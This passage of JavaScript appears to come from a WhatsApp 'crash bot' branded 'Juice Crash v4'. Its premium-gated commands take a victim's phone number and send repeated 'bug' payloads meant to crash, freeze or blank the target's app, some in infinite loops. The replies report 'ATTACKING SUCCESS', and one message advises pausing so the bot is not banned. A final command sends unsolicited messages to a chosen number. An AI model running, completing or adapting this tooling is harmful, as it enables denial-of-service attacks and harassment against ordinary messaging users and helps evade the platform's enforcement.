reply(`[ ؆ ] _ResultsCrashed_
 _*\`Status\`*_ : ✅
 _*\`Type\`*_ : _${command}_
> 10 minute pause so the bot doesn't get banned
> © 𝐉𝐮𝐢𝐜𝐞 𝐂𝐫𝐚𝐬𝐡 🐯 ✰️`)
}
break
case '1hit': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'x': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'death': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'boom': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 50; i++) {
await f10(target, Ptcp = true);
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await BlankScreen(target, Ptcp = true);
await trashloc(target);
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break
case 'juice-v1': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'juice-v2': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'juice-v3': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'juice-v4': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'juice-v5': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'juice-v6': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'juice-v7': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'juice-v8': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'juice-v9': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'juice-v10': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 50; i++) {
await f10(target, Ptcp = true);
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break
case 'die-v1': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'die-v2': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'die-v3': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'die-v4': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'die-v5': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'die-v6': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'die-v7': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'die-v8': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'die-v9': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 30; i++) {
await f10(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await DocBug(target);
await LocaBugs(target);
await IosMJ(target, Ptcp = true);
await crashbeta(target, ptcp = true);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break
case 'infinity': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'infinity-v1': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'infinity-v2': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'infinity-v3': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'infinity-v4': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'infinity-v5': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'infinity-v6': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'infinity-v7': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'infinity-v8': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'infinity-v9': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 50; i++) {
await DocBug(target);
await LocaBugs(target);
await DocBug(target);
await LocaBugs(target);
await DocBug(target);
await LocaBugs(target);
await DocBug(target);
await LocaBugs(target);
await DocBug(target);
await LocaBugs(target);
await DocBug(target);
await LocaBugs(target);
await DocBug(target);
await LocaBugs(target);
await DocBug(target);
await LocaBugs(target);
await DocBug(target);
await LocaBugs(target);
await IosMJ(target, Ptcp = true);
await crashbeta(target, ptcp = true);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break

case 'fc-bugfix1': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'fc-bugfix2': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'fc-bugfix3': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'fc-bugfix4': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'fc-bugfix5': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'fc-bugfix6': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'fc-bugfix7': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'fc-bugfix8': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'fc-bugfix9': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 40; i++) {
await f10(target, Ptcp = true);
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break

 //✰ 𝗕𝘂𝗴 ↯ 𝗡 𝗕𝗮𝗽𝗮𝗸 ✰
case 'aigle-v1': //*⪻ 𝗝𝘂𝗶𝗰𝗲 ⪼*
case 'aigle-v2': //*⪻ 𝗝𝘂𝗶𝗰𝗲 ⪼*
case 'aigle-v3': //*⪻ 𝗝𝘂𝗶𝗰𝗲 ⪼*
case 'aigle-v4': //*⪻ 𝗝𝘂𝗶𝗰𝗲 ⪼*
case 'aigle-v5': //*⪻ 𝗝𝘂𝗶𝗰𝗲 ⪼*
case 'aigle-v6': //*⪻ 𝗝𝘂𝗶𝗰𝗲 ⪼*
case 'aigle-v7': //*⪻ 𝗝𝘂𝗶𝗰𝗲 ⪼*
case 'aigle-v8': //*⪻ 𝗝𝘂𝗶𝗰𝗲 ⪼*
case 'aigle-v9': //*⪻ 𝗝𝘂𝗶𝗰𝗲 ⪼*
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 50; i++) {
await DocBug(target);
await LocaBugs(target);
await IosMJ(target, Ptcp = true);
await crashbeta(target, ptcp = true);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
await DocBug(target);
await LocaBugs(target);
await IosMJ(target, Ptcp = true);
await crashbeta(target, ptcp = true);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break

case 'unlimited-v1': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'unlimited-v2': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'unlimited-v3': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'unlimited-v4': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'unlimited-v5': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'unlimited-v6': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'unlimited-v7': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'unlimited-v8': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'unlimited-v9': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ini tidak akan berhenti jika kamu tidak melepas perangkat tertaut atau pun di sumber panel nya *@King Juice*`);
for (let i = 0; true; i++)  {
await f10(target, Ptcp = true);
await func1(target);
await Bug2(target);
await DocBug(target);
await LocaBugs(target);
await crashX(target);
await aipong(target);
await iponcrash(target);
await IosMJ(target, Ptcp = true);
await crashbeta(target, ptcp = true);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
await IosMJ(target, true);
await LocSystem(target);
await XiosVirus(target);
await QDIphone(target);
await QPayIos(target);
await QPayStriep(target);
await FBiphone(target);
await VenCrash(target);
await AppXCrash(target);
await SmCrash(target);
await SqCrash(target);
await IosMJ(target, true);
await XiosVirus(target);
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break

case 'virtexv1': //Juice bug jumlah
case 'virtexv2': //Juice bug jumlah
case 'virtexv3': //Juice bug jumlah
case 'virtexv4': //Juice bug jumlah
case 'virtexv5': //Juice bug jumlah
case 'virtexv6': //Juice bug jumlah
case 'virtexv7': //Juice bug jumlah
case 'virtexv8': //Juice bug jumlah
case 'virtexv9': //Juice bug jumlah
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; true; i++) {
await LocSystem(target);
await f10(target, Ptcp = true);
await XeonXRobust(target, Ptcp = true);
await thunderblast_doc(target);
await freezefile(target, QBug, Ptcp = true);
await BlankScreen(target, Ptcp = true);
await crashX(target, kuwoted);
await crashui2(target, ptcp = true);
await Bug2(target, ptcp = true);
await crashbeta(target, ptcp = true);
await thunderblast_notif(target);
await LocaBugs(target);
await DocBug(target);
await func1(target);
await killui(target, Ptcp = true);
await SmCrash(target);
await AppXCrash(target);
await VenCrash(target);
await UpiCrash(target);
await aipong(target);
await XiosVirus(target);
await QDIphone(target);
await QPayStriep(target);
await QXIphone(target);
await QPayIos(target);
await FBiphone(target);
await SqCrash(target);
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break

case 'trash-locv1': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'trash-locv2': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'trash-locv3': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'trash-locv4': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'trash-locv5': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'trash-locv6': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'trash-locv7': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'trash-locv8': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'trash-locv9': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
if (!isPremium) return reply(" khusus premium ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 0; i < 30; i++) {
await f10(target, Ptcp = true);
await func1(target);
await Bug2(target);
await DocBug(target);
await LocaBugs(target);
await crashX(target);
await aipong(target);
await iponcrash(target);
await IosMJ(target, Ptcp = true);
await crashbeta(target, ptcp = true);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
await IosMJ(target, true);
await LocSystem(target);
await XiosVirus(target);
await QDIphone(target);
await QPayIos(target);
await QPayStriep(target);
await FBiphone(target);
await VenCrash(target);
await AppXCrash(target);
await SmCrash(target);
await SqCrash(target);
await IosMJ(target, true);
await XiosVirus(target);
}
break;

case 'mechant': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 40; i++) {
await ngeloc(target, kuwoted);
await newsLetter(target);
await newsLetter(target);
await newsLetter(target);
await sendSystemCrashMessage(jid);
await PayMent(LockJids);
await sendSystemCrashMessage(jid);
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break

case 'paktzy1': //Juice bug jumlah
case 'paktzy2': //Juice bug jumlah
case 'paktzy3': //Juice bug jumlah
case 'paktzy4': //Juice bug jumlah
case 'paktzy5': //Juice bug jumlah
case 'paktzy6': //Juice bug jumlah
case 'paktzy7': //Juice bug jumlah
case 'paktzy8': //Juice bug jumlah
case 'paktzy9': //Juice bug jumlah
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; true; i++) {
await newsLetter(target);
await LocSystem(target);
await f10(target, Ptcp = true);
await XeonXRobust(target, Ptcp = true);
await thunderblast_doc(target);
await freezefile(target, QBug, Ptcp = true);
await BlankScreen(target, Ptcp = true);
await crashX(target, kuwoted);
await crashui2(target, ptcp = true);
await Bug2(target, ptcp = true);
await crashbeta(target, ptcp = true);
await thunderblast_notif(target);
await LocaBugs(target);
await DocBug(target);
await func1(target);
await killui(target, Ptcp = true);
await SmCrash(target);
await AppXCrash(target);
await VenCrash(target);
await UpiCrash(target);
await aipong(target);
await XiosVirus(target);
await QDIphone(target);
await QPayStriep(target);
await QXIphone(target);
await QPayIos(target);
await FBiphone(target);
await SqCrash(target);
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break

case 'bugui-unliv1': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'bugui-unliv2': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'bugui-unliv3': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'bugui-unliv4': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'bugui-unliv5': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'bugui-unliv6': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'bugui-unliv7': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'bugui-unliv8': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'bugui-unliv9': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ini tidak akan berhenti jika kamu tidak melepas perangkat tertaut atau pun di sumber panel nya *@Andrazyy*`);
for (let i = 0; true; i++)  {
await f10(target, Ptcp = true);
await func1(target);
await Bug2(target);
await DocBug(target);
await LocaBugs(target);
await crashX(target);
await aipong(target);
await iponcrash(target);
await IosMJ(target, Ptcp = true);
await crashbeta(target, ptcp = true);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
await IosMJ(target, true);
await LocSystem(target);
await XiosVirus(target);
await QDIphone(target);
await QPayIos(target);
await QPayStriep(target);
await FBiphone(target);
await VenCrash(target);
await AppXCrash(target);
await SmCrash(target);
await SqCrash(target);
await IosMJ(target, true);
await XiosVirus(target);
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break

//ᥫ᭡ 𝐕𝐈𝐏 𝐊𝐈𝐍𝐆 𝐉𝐔𝐈𝐂𝐄 ᥫ᭡*
case 'love-you': //*⪻ 𝗝𝘂𝗶𝗰𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case 'baise': //*⪻ 𝗝𝘂𝗶𝗰𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case 'sexe': //*⪻ 𝗝𝘂𝗶𝗰𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case 'kiss': //*⪻ 𝗝𝘂𝗶𝗰𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case 'girlyyy': //*⪻ 𝗝𝘂𝗶𝗰𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case 'sexy-girl': { //*⪻ 𝗝𝘂𝗶𝗰𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼* 
if (!q) return m.reply(`Example:\n ${prefix + command} 1849xxxx`)
BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
AndraZyy.sendMessage(BapakLuWkwk, {text: `💞 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐁𝐲 𝐊𝐢𝐧𝐠 𝐉𝐮𝐢𝐜𝐞 😖 👉🏻👈🏻 @𝐊𝐢𝐧𝐠𝐣𝐮𝐢𝐜𝐞𝐨𝐟𝐟𝐢𝐜𝐢𝐚𝐥 